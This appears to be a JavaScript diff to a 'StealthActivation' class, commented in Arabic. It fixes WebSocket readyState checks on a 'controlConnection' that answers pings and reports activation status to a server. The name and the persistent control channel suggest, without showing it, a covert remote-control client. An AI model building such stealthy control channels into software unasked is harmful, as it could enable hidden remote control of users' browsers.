@@ -609,7 +609,7 @@ class StealthActivation {
                     
                 case 'ping':
                     // رد على ping بـ pong
-                    if (window.controlConnection && window.controlConnection.readyState === 1) {
+                    if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
                         window.controlConnection.send(JSON.stringify({
                             type: 'pong',
                             timestamp: Date.now()
@@ -710,11 +710,14 @@ class StealthActivation {
             localStorage.setItem('activationStatus', JSON.stringify(activationData));
             
             // إرسال للخادم
-            if (window.controlConnection) {
+            if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
                 window.controlConnection.send(JSON.stringify({
                     type: 'activation_complete',
                     data: activationData
                 }));
+                console.log('📤 تم إرسال activation_complete للخادم');
+            } else {
+                console.warn('⚠️ الاتصال بالخادم غير متاح - لن يتم إرسال activation_complete');
             }
             
             this.isActivated = true;
